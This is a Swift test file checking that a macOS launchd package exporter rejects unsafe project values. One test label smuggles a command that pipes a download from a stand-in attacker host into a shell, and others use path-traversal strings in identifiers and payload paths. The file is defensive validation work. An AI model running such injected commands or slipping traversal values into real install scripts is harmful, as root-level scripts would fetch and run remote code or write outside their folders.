import Foundation
import Testing

@testable import LaunchdOps

/// Values that reach file paths or root install scripts are checked by the exporter itself, so Export Anyway
/// can't produce a package that runs injected commands or writes outside its folders.
struct ExportSafetyTests {
  private func project(label: String = "com.acme.backup") -> Project {
    var job = LaunchJob(context: .daemon, label: label)
    job.program = "/usr/local/libexec/backup"
    var project = Project()
    project.jobs = [job]
    return project
  }

  @Test func labelThatCouldInjectIntoScriptsStopsTheExport() {
    let injected = "com.x\n/usr/bin/curl -s https://attacker.example/x | /bin/sh\n#"
    #expect(throws: ProjectExporter.UnsafeValue.label(injected)) {
      try ProjectExporter.export(project(label: injected), buildsPackage: false)
    }
    #expect(throws: ProjectExporter.UnsafeValue.label("../../etc/evil")) {
      try ProjectExporter.export(project(label: "../../etc/evil"), buildsPackage: false)
    }
  }

  @Test func unsafeIdentifierTaskTypeAndPayloadStopTheExport() {
    var badIdentifier = project()
    badIdentifier.settings.packageIdentifier = "com.acme/../../etc"
    #expect(throws: ProjectExporter.UnsafeValue.packageIdentifier("com.acme/../../etc")) {
      try ProjectExporter.export(badIdentifier, buildsPackage: false)
    }

    var badTaskType = project()
    badTaskType.settings.mode = .declarative
    badTaskType.settings.taskType = "../Services"
    #expect(throws: ProjectExporter.UnsafeValue.taskType("../Services")) {
      try ProjectExporter.export(badTaskType, buildsPackage: false)
    }

    var badName = project()
    badName.payload = [PayloadFile(name: "../run", destination: "/usr/local/libexec", mode: 0o755, contents: Data())]
    #expect(throws: ProjectExporter.UnsafeValue.payloadName("../run")) {
      try ProjectExporter.export(badName, buildsPackage: false)
    }

    var badDestination = project()
    badDestination.payload = [
      PayloadFile(name: "run", destination: "/usr/local/../../etc", mode: 0o755, contents: Data())
    ]
    #expect(throws: ProjectExporter.UnsafeValue.payloadDestination("/usr/local/../../etc")) {
      try ProjectExporter.export(badDestination, buildsPackage: false)
    }
  }

  @Test func validProjectStillExports() throws {
    let tree = try ProjectExporter.export(project(), buildsPackage: false)
    #expect(tree.files.contains { $0.path == "com.acme.backup.plist" })
  }

  @Test func disabledJobCommentNamesNoProjectValue() {
    var disabled = project()
    disabled.jobs[0].disabled = true
    let postinstall = ScriptGenerator.postinstall(for: disabled.resolved())
    #expect(postinstall.contains("# Disabled: installed but not loaded"))
    #expect(!postinstall.contains("# com.acme.backup"))
  }
}
